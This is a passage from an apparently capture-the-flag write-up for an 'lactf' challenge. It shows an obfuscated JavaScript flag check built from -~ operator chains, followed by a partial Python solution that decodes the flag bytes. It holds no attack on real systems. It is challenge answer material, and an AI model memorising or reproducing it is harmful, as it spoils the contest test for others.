-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt([]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && flag.charCodeAt(-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) {
    console.log("That is the flag!");
} else {
    console.log("That is not the flag!");
}
```
#### Solution:
```py
flag = bytearray(b"lactf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}")
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
